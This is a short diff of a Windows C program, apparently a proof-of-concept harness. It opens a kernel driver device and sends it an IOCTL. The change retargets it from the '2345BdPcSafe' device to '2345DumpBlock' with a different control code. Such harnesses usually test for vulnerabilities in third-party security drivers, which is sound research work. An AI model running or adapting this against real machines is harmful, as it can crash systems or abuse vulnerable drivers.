@@ -18,10 +18,10 @@ void send(HANDLE handle, DWORD IOCTL)
 int _tmain(int argc, _TCHAR* argv[])
 {
 
-	HANDLE hDevice = CreateFile("\\\\.\\2345BdPcSafe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
+	HANDLE hDevice = CreateFile("\\\\.\\2345DumpBlock", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
 	if (hDevice != INVALID_HANDLE_VALUE)
 	{
-		send(hDevice, 0x00222108);
+		send(hDevice, 0x00222040);
 	}
 	return 0;
 
